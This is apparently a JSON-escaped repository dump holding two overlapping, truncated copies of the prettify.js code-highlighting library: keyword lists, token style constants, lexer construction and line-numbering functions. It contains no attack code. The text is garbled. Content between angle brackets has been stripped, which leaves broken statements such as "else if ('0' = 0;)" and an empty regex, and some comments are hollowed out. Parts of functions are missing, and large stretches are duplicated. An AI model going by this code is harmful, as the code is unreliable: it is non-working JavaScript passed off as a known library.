/^(DIR|FILE|array|vector|(de|priority_)?queue|(forward_)?list|stack|(const_)?(reverse_)?iterator|(unordered_)?(multi)?(set|map)|bitset|u?(int|float)\\d*)\\b/; // token style names. correspond to css classes /** * token style for a string literal * @const */ var PR_STRING = 'str'; /** * token style for a keyword * @const */ var PR_KEYWORD = 'kwd'; /** * token style for a comment * @const */ var PR_COMMENT = 'com'; /** * token style for a type * @const */ var PR_TYPE = 'typ'; /** * token style for a literal value. e.g. 1, null, true. * @const */ var PR_LITERAL = 'lit'; /** * token style for a punctuation string. * @const */ var PR_PUNCTUATION = 'pun'; /** * token style for plain text. * @const */ var PR_PLAIN = 'pln'; /** * token style for an sgml tag. * @const */ var PR_TAG = 'tag'; /** * token style for a markup declaration such as a DOCTYPE. * @const */ var PR_DECLARATION = 'dec'; /** * token style for embedded source. * @const */ var PR_SOURCE = 'src'; /** * token style for an sgml attribute name. * @const */ var PR_ATTRIB_NAME = 'atn'; /** * token style for an sgml attribute value. * @const */ var PR_ATTRIB_VALUE = 'atv'; /** * A class that indicates a section of markup that is not code, e.g. to allow * embedding of line numbers within code listings. * @const */ var PR_NOCODE = 'nocode'; // Regex pattern below is automatically generated by regexpPrecederPatterns.pl // Do not modify, your changes will be erased. // CAVEAT: this does not properly handle the case where a regular // expression immediately follows another since a regular expression may // have flags for case-sensitivity and the like. Having regexp tokens // adjacent is not valid in any language I'm aware of, so I'm punting. // TODO: maybe style special characters inside a regexp as punctuation. /** * A set of tokens that can precede a regular expression literal in * javascript * http://web.archive.org/web/20070717142515/http://www.mozilla.org/js/language/js20/rationale/syntax.html * has the full list, but I've removed ones that might be problematic when * seen in languages that don't support regular expression literals. * * Specifically, I've removed any keywords that can't precede a regexp * literal in a syntactically legal javascript program, and I've removed the * \"in\" keyword since it's not a keyword in many languages, and might be used * as a count of inches. * * The link above does not accurately describe EcmaScript rules since * it fails to distinguish between (a=++/b/i) and (a++/b/i) but it works * very well in practice. * * @private * @const */ var REGEXP_PRECEDER_PATTERN = '(?:^^\\\\.?|[+-]|[!=]=?=?|\\\\#|%=?|&&?=?|\\\\(|\\\\*=?|[+\\\\-]=|->|\\\\/=?|::?|?>?=?|,|;|\\\\?|@|\\\\[|~|{|\\\\^\\\\^?=?|\\\\|\\\\|?=?|break|case|continue|delete|do|else|finally|instanceof|return|throw|try|typeof)\\\\s*'; /** * Given a group of {@link RegExp}s, returns a {@code RegExp} that globally * matches the union of the sets of strings matched by the input RegExp. * Since it matches globally, if the input strings have a start-of-input * anchor (/^.../), it is ignored for the purposes of unioning. * @param {Array.} regexs non multiline, non-global regexs. * @return {RegExp} a global regex. */ function combinePrefixPatterns(regexs) { var capturedGroupIndex = 0; var needToFoldCase = false; var ignoreCase = false; for (var i = 0, n = regexs.length; i < n; ++i) { var regex = regexs[i]; if (regex.ignoreCase) { ignoreCase = true; } else if (/[a-z]/i.test(regex.source.replace( /\\\\u[0-9a-f]{4}|\\\\x[0-9a-f]{2}|\\\\[^ux]/gi, ''))) { needToFoldCase = true; ignoreCase = false; break; } } var escapeCharToCodeUnit = { 'b': 8, 't': 9, 'n': 0xa, 'v': 0xb, 'f': 0xc, 'r': 0xd }; function decodeEscape(charsetPart) { var cc0 = charsetPart.charCodeAt(0); if (cc0 !== 92 /* \\\\ */) { return cc0; } var c1 = charsetPart.charAt(1); cc0 = escapeCharToCodeUnit[c1]; if (cc0) { return cc0; } else if ('0' = 0;) { shortcuts[shortcutChars.charAt(c)] = patternParts; } } var regex = patternParts[1]; var k = '' + regex; if (!regexKeys.hasOwnProperty(k)) { allRegexs.push(regex); regexKeys[k] = null; } } allRegexs.push(/[\\0-\\uffff]/); tokenizer = combinePrefixPatterns(allRegexs); })(); var nPatterns = fallthroughStylePatterns.length; /** * Lexes job.sourceCode and attaches an output array job.decorations of * style classes preceded by the position at which they start in * job.sourceCode in order. * * @type{function (JobT)} */ var decorate = function (job) { var sourceCode = job.sourceCode, basePos = job.basePos; var sourceNode = job.sourceNode; /** Even entries are positions in source in ascending order. Odd enties * are style markers (e.g., PR_COMMENT) that run from that position until * the end. * @type {DecorationsT} */ var decorations = [basePos, PR_PLAIN]; var pos = 0; // index into sourceCode var tokens = sourceCode.match(tokenizer) || []; var styleCache = {}; for (var ti = 0, nTokens = tokens.length; ti < nTokens; ++ti) { var token = tokens[ti]; var style = styleCache[token]; var match = void 0; var isEmbedded; if (typeof style === 'string') { isEmbedded = false; } else { var patternParts = shortcuts[token.charAt(0)]; if (patternParts) { match = token.match(patternParts[1]); style = patternParts[0]; } else { for (var i = 0; i < nPatterns; ++i) { patternParts = fallthroughStylePatterns[i]; match = token.match(patternParts[1]); if (match) { style = patternParts[0]; break; } } if (!match) { // make sure that we make progress style = PR_PLAIN; } } isEmbedded = style.length >= 5 && 'lang-' === style.substring(0, 5); if (isEmbedded && !(match && typeof match[1] === 'string')) { isEmbedded = false; style = PR_SOURCE; } if (!isEmbedded) { styleCache[token] = style; } } var tokenStart = pos; pos += token.length; if (!isEmbedded) { decorations.push(basePos + tokenStart, style); } else { // Treat group 1 as an embedded block of source code. var embeddedSource = match[1]; var embeddedSourceStart = token.indexOf(embeddedSource); var embeddedSourceEnd = embeddedSourceStart + embeddedSource.length; if (match[2]) { // If embeddedSource can be blank, then it would match at the // beginning which would cause us to infinitely recurse on the // entire token, so we catch the right context in match[2]. embeddedSourceEnd = token.length - match[2].length; embeddedSourceStart = embeddedSourceEnd - embeddedSource.length; } var lang = style.substring(5); // Decorate the left of the embedded source appendDecorations( sourceNode, basePos + tokenStart, token.substring(0, embeddedSourceStart), decorate, decorations); // Decorate the embedded source appendDecorations( sourceNode, basePos + tokenStart + embeddedSourceStart, embeddedSource, langHandlerForExtension(lang, embeddedSource), decorations); // Decorate the right of the embedded section appendDecorations( sourceNode, basePos + tokenStart + embeddedSourceEnd, token.substring(embeddedSourceEnd), decorate, decorations); } } job.decorations = decorations; }; return decorate; } /** returns a function that produces a list of decorations from source text. * * This code treats \", ', and ` as string delimiters, and \\ as a string * escape. It does not recognize perl's qq() style strings. * It has no special handling for double delimiter escapes as in basic, or * the tripled delimiters used in python, but should work on those regardless * although in those cases a single string literal may be broken up into * multiple adjacent string literals. * * It recognizes C, C++, and shell style comments. * * @param {Object} options a set of optional parameters. * @return {function (JobT)} a function that examines the source code * in the input job and builds a decoration list which it attaches to * the job. */ function sourceDecorator(options) { var shortcutStylePatterns = [], fallthroughStylePatterns = []; if (options['tripleQuotedStrings']) { // '''multi-line-string''', 'single-line-string', and double-quoted shortcutStylePatterns.push( [PR_STRING, /^(?:\\'\\'\\'(?:[^\\'\\\\]|\\\\[\\s\\S]|\\'{1,2}(?=[^\\']))*(?:\\'\\'\\'|$)|\\\"\\\"\\\"(?:[^\\\"\\\\]|\\\\[\\s\\S]|\\\"{1,2}(?=[^\\\"]))*(?:\\\"\\\"\\\"|$)|\\'(?:[^\\\\\\']|\\\\[\\s\\S])*(?:\\'|$)|\\\"(?:[^\\\\\\\"]|\\\\[\\s\\S])*(?:\\\"|$))/, null, '\\'\"']); } else if (options['multiLineStrings']) { // 'multi-line-string', \"multi-line-string\" shortcutStylePatterns.push( [PR_STRING, /^(?:\\'(?:[^\\\\\\']|\\\\[\\s\\S])*(?:\\'|$)|\\\"(?:[^\\\\\\\"]|\\\\[\\s\\S])*(?:\\\"|$)|\\`(?:[^\\\\\\`]|\\\\[\\s\\S])*(?:\\`|$))/, null, '\\'\"`']); } else { // 'single-line-string', \"single-line-string\" shortcutStylePatterns.push( [PR_STRING, /^(?:\\'(?:[^\\\\\\'\\r\\n]|\\\\.)*(?:\\'|$)|\\\"(?:[^\\\\\\\"\\r\\n]|\\\\.)*(?:\\\"|$))/, null, '\"\\'']); } if (options['verbatimStrings']) { // verbatim-string-literal production from the C# grammar. See issue 93. fallthroughStylePatterns.push( [PR_STRING, /^@\\\"(?:[^\\\"]|\\\"\\\")*(?:\\\"|$)/, null]); } var hc = options['hashComments']; if (hc) { if (options['cStyleComments']) { if (hc > 1) { // multiline hash comments shortcutStylePatterns.push( [PR_COMMENT, /^#(?:##(?:[^#]|#(?!##))*(?:###|$)|.*)/, null, '#']); } else { // Stop C preprocessor declarations at an unclosed open comment shortcutStylePatterns.push( [PR_COMMENT, /^#(?:(?:define|e(?:l|nd)if|else|error|ifn?def|include|line|pragma|undef|warning)\\b|[^\\r\\n]*)/, null, '#']); } // #include fallthroughStylePatterns.push( [PR_STRING, /^/, null]); } else { shortcutStylePatterns.push([PR_COMMENT, /^#[^\\r\\n]*/, null, '#']); } } if (options['cStyleComments']) { fallthroughStylePatterns.push([PR_COMMENT, /^\\/\\/[^\\r\\n]*/, null]); fallthroughStylePatterns.push( [PR_COMMENT, /^\\/\\*[\\s\\S]*?(?:\\*\\/|$)/, null]); } var regexLiterals = options['regexLiterals']; if (regexLiterals) { /** * @const */ var regexExcls = regexLiterals > 1 ? '' // Multiline regex literals : '\\n\\r'; /** * @const */ var regexAny = regexExcls ? '.' : '[\\\\S\\\\s]'; /** * @const */ var REGEX_LITERAL = ( // A regular expression literal starts with a slash that is // not followed by * or / so that it is not confused with // comments. '/(?=[^/*' + regexExcls + '])' // and then contains any number of raw characters, + '(?:[^/\\\\x5B\\\\x5C' + regexExcls + ']' // escape sequences (\\x5C), + '|\\\\x5C' + regexAny // or non-nesting character sets (\\x5B\\x5D); + '|\\\\x5B(?:[^\\\\x5C\\\\x5D' + regexExcls + ']' + '|\\\\x5C' + regexAny + ')*(?:\\\\x5D|$))+' // finally closed by a /. + '/'); fallthroughStylePatterns.push( ['lang-regex', RegExp('^' + REGEXP_PRECEDER_PATTERN + '(' + REGEX_LITERAL + ')') ]); } var types = options['types']; if (types) { fallthroughStylePatterns.push([PR_TYPE, types]); } var keywords = (\"\" + options['keywords']).replace(/^ | $/g, ''); if (keywords.length) { fallthroughStylePatterns.push( [PR_KEYWORD, new RegExp('^(?:' + keywords.replace(/[\\s,]+/g, '|') + ')\\\\b'), null]); } shortcutStylePatterns.push([PR_PLAIN, /^\\s+/, null, ' \\r\\n\\t\\xA0']); var punctuation = // The Bash man page says // A word is a sequence of characters considered as a single // unit by GRUB. Words are separated by metacharacters, // which are the following plus space, tab, and newline: { } // | & $ ; < > // ... // A word beginning with # causes that word and all remaining // characters on that line to be ignored. // which means that only a '#' after /(?:^|[{}|&$;\\s])/ starts a // comment but empirically // $ echo // $ echo \\$# // $# // $ echo }# // }# // so /(?:^|[|&;\\s])/ is more appropriate. // http://gcc.gnu.org/onlinedocs/gcc-2.95.3/cpp_1.html#SEC3 // suggests that this definition is compatible with a // default mode that tries to use a single token definition // to recognize both bash/python style comments and C // preprocessor directives. // This definition of punctuation does not include # in the list of // follow-on exclusions, so # will not be broken before if preceeded // by a punctuation character. We could try to exclude # after // [|&;] but that doesn't seem to cause many major problems. // If that does turn out to be a problem, we should change the below // when hc is truthy to include # in the run of punctuation characters // only when not followint [|&;]. '^.[^\\\\s\\\\w.$@\\'\"`/\\\\\\\\]*'; if (options['regexLiterals']) { punctuation += '(?!\\s*\\/)'; } fallthroughStylePatterns.push( // TODO(mikesamuel): recognize non-latin letters and numerals in idents [PR_LITERAL, /^@[a-z_$][a-z_$@0-9]*/i, null], [PR_TYPE, /^(?:[@_]?[A-Z]+[a-z][A-Za-z_$@0-9]*|\\w+_t\\b)/, null], [PR_PLAIN, /^[a-z_$][a-z_$@0-9]*/i, null], [PR_LITERAL, new RegExp( '^(?:' // A hex number + '0x[a-f0-9]+' // or an octal or decimal number, + '|(?:\\\\d(?:_\\\\d+)*\\\\d*(?:\\\\.\\\\d*)?|\\\\.\\\\d\\\\+)' // possibly in scientific notation + '(?:e[+\\\\-]?\\\\d+)?' + ')' // with an optional modifier like UL for unsigned long + '[a-z]*', 'i'), null, '0123456789'], // Don't treat escaped quotes in bash as starting strings. // See issue 144. [PR_PLAIN, /^\\\\[\\s\\S]?/, null], [PR_PUNCTUATION, new RegExp(punctuation), null]); return createSimpleLexer(shortcutStylePatterns, fallthroughStylePatterns); } var decorateSource = sourceDecorator({ 'keywords': ALL_KEYWORDS, 'hashComments': true, 'cStyleComments': true, 'multiLineStrings': true, 'regexLiterals': true }); /** * Given a DOM subtree, wraps it in a list, and puts each line into its own * list item. * * @param {Node} node modified in place. Its content is pulled into an * HTMLOListElement, and each line is moved into a separate list item. * This requires cloning elements, so the input might not have unique * IDs after numbering. * @param {number|null|boolean} startLineNum * If truthy, coerced to an integer which is the 1-indexed line number * of the first line of code. The number of the first line will be * attached to the list. * @param {boolean} isPreformatted true iff white-space in text nodes should * be treated as significant. */ function numberLines(node, startLineNum, isPreformatted) { var nocode = /(?:^|\\s)nocode(?:\\s|$)/; var lineBreak = /\\r\\n?|\\n/; var document = node.ownerDocument; var li = document.createElement('li'); while (node.firstChild) { li.appendChild(node.firstChild); } // An array of lines. We split below, so this is initialized to one // un-split line. var listItems = [li]; function walk(node) { var type = node.nodeType; if (type == 1 && !nocode.test(node.className)) { // Element if ('br' === node.nodeName.toLowerCase()) { breakAfter(node); // Discard the since it is now flush against a . if (node.parentNode) { node.parentNode.removeChild(node); } } else { for (var child = node.firstChild; child; child = child.nextSibling) { walk(child); } } } else if ((type == 3 || type == 4) && isPreformatted) { // Text var text = node.nodeValue; var match = text.match(lineBreak); if (match) { var firstLine = text.substring(0, match.index); node.nodeValue = firstLine; var tail = text.substring(match.index + match[0].length); if (tail) { var parent = node.parentNode; parent.insertBefore( document.createTextNode(tail), node.nextSibling); } breakAfter(node); if (!firstLine) { // Don't leave blank text nodes in the DOM. node.parentNode.removeChild(node); } } } } // Split a line after the given node. function breakAfter(lineEndNode) { // If there's nothing to the right, then we can skip ending the line // here, and move root-wards since splitting just before an end-tag // would require us to create a bunch of empty copies. while (!lineEndNode.nextSibling) { lineEndNode = lineEndNode.parentNode; if (!lineEndNode) { return; } } function breakLeftOf(limit, copy) { // Clone shallowly if this node needs to be on both sides of the break. var rightSide = copy ? limit.cloneNode(false) : limit; var parent = limit.parentNode; if (parent) { // We clone the parent chain. // This helps us resurrect important styling elements that cross lines. // E.g. in FooBar // should be rewritten to FooBar. var parentClone = breakLeftOf(parent, 1); // Move the clone and everything to the right of the original // onto the cloned parent. var next = limit.nextSibling; parentClone.appendChild(rightSide); for (var sibling = next; sibling; sibling = next) { next = sibling.nextSibling; parentClone.appendChild(sibling); } } return rightSide; } var copiedListItem = breakLeftOf(lineEndNode.nextSibling, 0); // Walk the parent chain until we reach an unattached LI. for (var parent; // Check nodeType since IE invents document fragments. (parent = copiedListItem.parentNode) && parent.nodeType === 1;) { copiedListItem = parent; } // Put it on the list of lines for later processing. listItems.push(copiedListItem); } // Split lines while there are lines left to split. for (var i = 0; // Number of lines that have been split so far. i < listItems.length; // length updated by breakAfter calls. ++i) { walk(listItems[i]); } // Make sure numeric indices show correctly. if (startLineNum === (startLineNum|0)) { listItems[0].setAttribute('value', startLineNum); } var ol = document.createElement('ol'); ol.className = 'linenums'; var offset = Math.max(0, ((startLineNum - 1 /* zero index */)) | 0) || 0; for (var i = 0, n = listItems.length; i < n; ++i) { li = listItems[i]; // Stick a class on the LIs so that stylesheets can // color odd/even rows, or any other row pattern that // is co-prime with 10. li.className = 'L' + ((i + offset) % 10); if (!li.firstChild) { li.appendChild(document.createTextNode('\\xA0')); } ol.appendChild(li); } node.appendChild(ol); } /** * Breaks {@code job.sourceCode} around style boundaries in * {@code job.decorations} and modifies {@code job.sourceNode} in place. * @param {JobT} job * @private */ function recombineTagsAndDecorations(job) { var isIE8OrEarlier = /\\bMSIE\\s(\\d+)/.exec(navigator.userAgent); isIE8OrEarlier = isIE8OrEarlier && +isIE8OrEarlier[1]","path":"plugins/prettify/prettify.js"},{"title":"","text":"var IN_GLOBAL_SCOPE = false; /** * @license * Copyright (C) 2006 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * some functions for browser-side pretty printing of code contained in html. * * * For a fairly comprehensive set of languages see the * README * file that came with this source. At a minimum, the lexer should work on a * number of languages including C and friends, Java, Python, Bash, SQL, HTML, * XML, CSS, Javascript, and Makefiles. It works passably on Ruby, PHP and Awk * and a subset of Perl, but, because of commenting conventions, doesn't work on * Smalltalk, Lisp-like, or CAML-like languages without an explicit lang class. * * Usage: * include this source file in an html page via * {@code } * define style rules. See the example page for examples. * mark the {@code } and {@code } tags in your source with * {@code class=prettyprint.} * You can also use the (html deprecated) {@code } tag, but the pretty * printer needs to do more substantial DOM manipulations to support that, so * some css styles may not be preserved. * * That's it. I wanted to keep the API as simple as possible, so there's no * need to specify which language the code is in, but if you wish, you can add * another class to the {@code } or {@code } element to specify the * language, as in {@code }. Any class that * starts with \"lang-\" followed by a file extension, specifies the file type. * See the \"lang-*.js\" files in this directory for code that implements * per-language file handlers. * * Change log: * cbeust, 2006/08/22 * * Java annotations (start with \"@\") are now captured as literals (\"lit\") * * @requires console */ // JSLint declarations /*global console, document, navigator, setTimeout, window, define */ /** * {@type !{ * 'createSimpleLexer': function (Array, Array): (function (JobT)), * 'registerLangHandler': function (function (JobT), Array.), * 'PR_ATTRIB_NAME': string, * 'PR_ATTRIB_NAME': string, * 'PR_ATTRIB_VALUE': string, * 'PR_COMMENT': string, * 'PR_DECLARATION': string, * 'PR_KEYWORD': string, * 'PR_LITERAL': string, * 'PR_NOCODE': string, * 'PR_PLAIN': string, * 'PR_PUNCTUATION': string, * 'PR_SOURCE': string, * 'PR_STRING': string, * 'PR_TAG': string, * 'PR_TYPE': string, * 'prettyPrintOne': function (string, string, number|boolean), * 'prettyPrint': function (?function, ?(HTMLElement|HTMLDocument)) * }} * @const */ var PR; /** * Split {@code prettyPrint} into multiple timeouts so as not to interfere with * UI events. * If set to {@code false}, {@code prettyPrint()} is synchronous. */ var PR_SHOULD_USE_CONTINUATION = true if (typeof window !== 'undefined') { window['PR_SHOULD_USE_CONTINUATION'] = PR_SHOULD_USE_CONTINUATION; } /** * Pretty print a chunk of code. * @param {string} sourceCodeHtml The HTML to pretty print. * @param {string} opt_langExtension The language name to use. * Typically, a filename extension like 'cpp' or 'java'. * @param {number|boolean} opt_numberLines True to number lines, * or the 1-indexed number of the first line in sourceCodeHtml. * @return {string} code as html, but prettier */ var prettyPrintOne; /** * Find all the {@code } and {@code } tags in the DOM with * {@code class=prettyprint} and prettify them. * * @param {Function} opt_whenDone called when prettifying is done. * @param {HTMLElement|HTMLDocument} opt_root an element or document * containing all the elements to pretty print. * Defaults to {@code document.body}. */ var prettyPrint; (function () { var win = (typeof window !== 'undefined') ? window : {}; // Keyword lists for various languages. // We use things that coerce to strings to make them compact when minified // and to defeat aggressive optimizers that fold large string constants. var FLOW_CONTROL_KEYWORDS = [\"break,continue,do,else,for,if,return,while\"]; var C_KEYWORDS = [FLOW_CONTROL_KEYWORDS,\"auto,case,char,const,default,\" + \"double,enum,extern,float,goto,inline,int,long,register,restrict,short,signed,\" + \"sizeof,static,struct,switch,typedef,union,unsigned,void,volatile\"]; var COMMON_KEYWORDS = [C_KEYWORDS,\"catch,class,delete,false,import,\" + \"new,operator,private,protected,public,this,throw,true,try,typeof\"]; var CPP_KEYWORDS = [COMMON_KEYWORDS,\"alignas,alignof,align_union,asm,axiom,bool,\" + \"concept,concept_map,const_cast,constexpr,decltype,delegate,\" + \"dynamic_cast,explicit,export,friend,generic,late_check,\" + \"mutable,namespace,noexcept,noreturn,nullptr,property,reinterpret_cast,static_assert,\" + \"static_cast,template,typeid,typename,using,virtual,where\"]; var JAVA_KEYWORDS = [COMMON_KEYWORDS, \"abstract,assert,boolean,byte,extends,finally,final,implements,import,\" + \"instanceof,interface,null,native,package,strictfp,super,synchronized,\" + \"throws,transient\"]; var CSHARP_KEYWORDS = [COMMON_KEYWORDS, \"abstract,add,alias,as,ascending,async,await,base,bool,by,byte,checked,decimal,delegate,descending,\" + \"dynamic,event,finally,fixed,foreach,from,get,global,group,implicit,in,interface,\" + \"internal,into,is,join,let,lock,null,object,out,override,orderby,params,\" + \"partial,readonly,ref,remove,sbyte,sealed,select,set,stackalloc,string,select,uint,ulong,\" + \"unchecked,unsafe,ushort,value,var,virtual,where,yield\"]; var COFFEE_KEYWORDS = \"all,and,by,catch,class,else,extends,false,finally,\" + \"for,if,in,is,isnt,loop,new,no,not,null,of,off,on,or,return,super,then,\" + \"throw,true,try,unless,until,when,while,yes\"; var JSCRIPT_KEYWORDS = [COMMON_KEYWORDS, \"abstract,async,await,constructor,debugger,enum,eval,export,from,function,\" + \"get,import,implements,instanceof,interface,let,null,of,set,undefined,\" + \"var,with,yield,Infinity,NaN\"]; var PERL_KEYWORDS = \"caller,delete,die,do,dump,elsif,eval,exit,foreach,for,\" + \"goto,if,import,last,local,my,next,no,our,print,package,redo,require,\" + \"sub,undef,unless,until,use,wantarray,while,BEGIN,END\"; var PYTHON_KEYWORDS = [FLOW_CONTROL_KEYWORDS, \"and,as,assert,class,def,del,\" + \"elif,except,exec,finally,from,global,import,in,is,lambda,\" + \"nonlocal,not,or,pass,print,raise,try,with,yield,\" + \"False,True,None\"]; var RUBY_KEYWORDS = [FLOW_CONTROL_KEYWORDS, \"alias,and,begin,case,class,\" + \"def,defined,elsif,end,ensure,false,in,module,next,nil,not,or,redo,\" + \"rescue,retry,self,super,then,true,undef,unless,until,when,yield,\" + \"BEGIN,END\"]; var SH_KEYWORDS = [FLOW_CONTROL_KEYWORDS, \"case,done,elif,esac,eval,fi,\" + \"function,in,local,set,then,until\"]; var ALL_KEYWORDS = [ CPP_KEYWORDS, CSHARP_KEYWORDS, JAVA_KEYWORDS, JSCRIPT_KEYWORDS, PERL_KEYWORDS, PYTHON_KEYWORDS, RUBY_KEYWORDS, SH_KEYWORDS]; var C_TYPES = /^(DIR|FILE|array|vector|(de|priority_)?queue|(forward_)?list|stack|(const_)?(reverse_)?iterator|(unordered_)?(multi)?(set|map)|bitset|u?(int|float)\\d*)\\b/; // token style names. correspond to css classes /** * token style for a string literal * @const */ var PR_STRING = 'str'; /** * token style for a keyword * @const */ var PR_KEYWORD = 'kwd'; /** * token style for a comment * @const */ var PR_COMMENT = 'com'; /** * token style for a type * @const */ var PR_TYPE = 'typ'; /** * token style for a literal value. e.g. 1, null, true. * @const */ var PR_LITERAL = 'lit'; /** * token style for a punctuation string. * @const */ var PR_PUNCTUATION = 'pun'; /** * token style for plain text. * @const */ var PR_PLAIN = 'pln'; /** * token style for an sgml tag. * @const */ var PR_TAG = 'tag'; /** * token style for a markup declaration such as a DOCTYPE. * @const */ var PR_DECLARATION = 'dec'; /** * token style for embedded source. * @const */ var PR_SOURCE = 'src'; /** * token style for an sgml attribute name. * @const */ var PR_ATTRIB_NAME = 'atn'; /** * token style for an sgml attribute value. * @const */ var PR_ATTRIB_VALUE = 'atv'; /** * A class that indicates a section of markup that is not code, e.g. to allow * embedding of line numbers within code listings. * @const */ var PR_NOCODE = 'nocode'; // Regex pattern below is automatically generated by regexpPrecederPatterns.pl // Do not modify, your changes will be erased. // CAVEAT: this does not properly handle the case where a regular // expression immediately follows another since a regular expression may // have flags for case-sensitivity and the like. Having regexp tokens // adjacent is not valid in any language I'm aware of, so I'm punting. // TODO: maybe style special characters inside a regexp as punctuation. /** * A set of tokens that can precede a regular expression literal in * javascript * http://web.archive.org/web/20070717142515/http://www.mozilla.org/js/language/js20/rationale/syntax.html * has the full list, but I've removed ones that might be problematic when * seen in languages that don't support regular expression literals. * * Specifically, I've removed any keywords that can't precede a regexp * literal in a syntactically legal javascript program, and I've removed the * \"in\" keyword since it's not a keyword in many languages, and might be used * as a count of inches. * * The link above does not accurately describe EcmaScript rules since * it fails to distinguish between (a=++/b/i) and (a++/b/i) but it works * very well in practice. * * @private * @const */ var REGEXP_PRECEDER_PATTERN = '(?:^^\\\\.?|[+-]|[!=]=?=?|\\\\#|%=?|&&?=?|\\\\(|\\\\*=?|[+\\\\-]=|->|\\\\/=?|::?|?>?=?|,|;|\\\\?|@|\\\\[|~|{|\\\\^\\\\^?=?|\\\\|\\\\|?=?|break|case|continue|delete|do|else|finally|instanceof|return|throw|try|typeof)\\\\s*'; /** * Given a group of {@link RegExp}s, returns a {@code RegExp} that globally * matches the union of the sets of strings matched by the input RegExp. * Since it matches globally, if the input strings have a start-of-input * anchor (/^.../), it is ignored for the purposes of unioning. * @param {Array.} regexs non multiline, non-global regexs. * @return {RegExp} a global regex. */ function combinePrefixPatterns(regexs) { var capturedGroupIndex = 0; var needToFoldCase = false; var ignoreCase = false; for (var i = 0, n = regexs.length; i < n; ++i) { var regex = regexs[i]; if (regex.ignoreCase) { ignoreCase = true; } else if (/[a-z]/i.test(regex.source.replace( /\\\\u[0-9a-f]{4}|\\\\x[0-9a-f]{2}|\\\\[^ux]/gi, ''))) { needToFoldCase = true; ignoreCase = false; break; } } var escapeCharToCodeUnit = { 'b': 8, 't': 9, 'n': 0xa, 'v': 0xb, 'f': 0xc, 'r': 0xd }; function decodeEscape(charsetPart) { var cc0 = charsetPart.charCodeAt(0); if (cc0 !== 92 /* \\\\ */) { return cc0; } var c1 = charsetPart.charAt(1); cc0 = escapeCharToCodeUnit[c1]; if (cc0) { return cc0; } else if ('0' = 0;) { shortcuts[shortcutChars.charAt(c)] = patternParts; } } var regex = patternParts[1]; var k = '' + regex; if (!regexKeys.hasOwnProperty(k)) { allRegexs.push(regex); regexKeys[k] = null; } } allRegexs.push(/[\\0-\\uffff]/); tokenizer = combinePrefixPatterns(allRegexs); })(); var nPatterns = fallthroughStylePatterns.length; /** * Lexes job.sourceCode and attaches an output array job.decorations of * style classes preceded by the position at which they start in * job.sourceCode in order. * * @type{function (JobT)} */ var decorate = function (job) { var sourceCode = job.sourceCode, basePos = job.basePos; var sourceNode = job.sourceNode; /** Even entries are positions in source in ascending order. Odd enties * are style markers (e.g., PR_COMMENT) that run from that position until * the end. * @type {DecorationsT} */ var decorations = [basePos, PR_PLAIN]; var pos = 0; // index into sourceCode var tokens = sourceCode.match(tokenizer) || []; var styleCache = {}; for (var ti = 0, nTokens = tokens.length; ti < nTokens; ++ti) { var token = tokens[ti]; var style = styleCache[token]; var match = void 0; var isEmbedded; if (typeof style === 'string') { isEmbedded = false; } else { var patternParts = shortcuts[token.charAt(0)]; if (patternParts) { match = token.match(patternParts[1]); style = patternParts[0]; } else { for (var i = 0; i < nPatterns; ++i) { patternParts = fallthroughStylePatterns[i]; match = token.match(patternParts[1]); if (match) { style = patternParts[0]; break; } } if (!match) { // make sure that we make progress style = PR_PLAIN; } } isEmbedded = style.length >= 5 && 'lang-' === style.substring(0, 5); if (isEmbedded && !(match && typeof match[1] === 'string')) { isEmbedded = false; style = PR_SOURCE; } if (!isEmbedded) { styleCache[token] = style; } } var tokenStart = pos; pos += token.length; if (!isEmbedded) { decorations.push(basePos + tokenStart, style); } else { // Treat group 1 as an embedded block of source code. var embeddedSource = match[1]; var embeddedSourceStart = token.indexOf(embeddedSource); var embeddedSourceEnd = embeddedSourceStart + embeddedSource.length; if (match[2]) { // If embeddedSource can be blank, then it would match at the // beginning which would cause us to infinitely recurse on the // entire token, so we catch the right context in match[2]. embeddedSourceEnd = token.length - match[2].length; embeddedSourceStart = embeddedSourceEnd - embeddedSource.length; } var lang = style.substring(5); // Decorate the left of the embedded source appendDecorations( sourceNode, basePos + tokenStart, token.substring(0, embeddedSourceStart), decorate, decorations); // Decorate the embedded source appendDecorations( sourceNode, basePos + tokenStart + embeddedSourceStart, embeddedSource, langHandlerForExtension(lang, embeddedSource), decorations); // Decorate the right of the embedded section appendDecorations( sourceNode, basePos + tokenStart + embeddedSourceEnd, token.substring(embeddedSourceEnd), decorate, decorations); } } job.decorations = decorations; }; return decorate; } /** returns a function that produces a list of decorations from source text. * * This code treats \", ', and ` as string delimiters, and \\ as a string * escape. It does not recognize perl's qq() style strings. * It has no special handling for double delimiter escapes as in basic, or * the tripled delimiters used in python, but should work on those regardless * although in those cases a single string literal may be broken up into * multiple adjacent string literals. * * It recognizes C, C++, and shell style comments. * * @param {Object} options a set of optional parameters. * @return {function (JobT)} a function that examines the source code * in the input job and builds a decoration list which it attaches to * the job. */ function sourceDecorator(options) { var shortcutStylePatterns = [], fallthroughStylePatterns = []; if (options['tripleQuotedStrings']) { // '''multi-line-string''', 'single-line-string', and double-quoted shortcutStylePatterns.push( [PR_STRING, /^(?:\\'\\'\\'(?:[^\\'\\\\]|\\\\[\\s\\S]|\\'{1,2}(?=[^\\']))*(?:\\'\\'\\'|$)|\\\"\\\"\\\"(?:[^\\\"\\\\]|\\\\[\\s\\S]|\\\"{1,2}(?=[^\\\"]))*(?:\\\"\\\"\\\"|$)|\\'(?:[^\\\\\\']|\\\\[\\s\\S])*(?:\\'|$)|\\\"(?:[^\\\\\\\"]|\\\\[\\s\\S])*(?:\\\"|$))/, null, '\\'\"']); } else if (options['multiLineStrings']) { // 'multi-line-string', \"multi-line-string\" shortcutStylePatterns.push( [PR_STRING, /^(?:\\'(?:[^\\\\\\']|\\\\[\\s\\S])*(?:\\'|$)|\\\"(?:[^\\\\\\\"]|\\\\[\\s\\S])*(?:\\\"|$)|\\`(?:[^\\\\\\`]|\\\\[\\s\\S])*(?:\\`|$))/, null, '\\'\"`']); } else { // 'single-line-string', \"single-line-string\" shortcutStylePatterns.push( [PR_STRING, 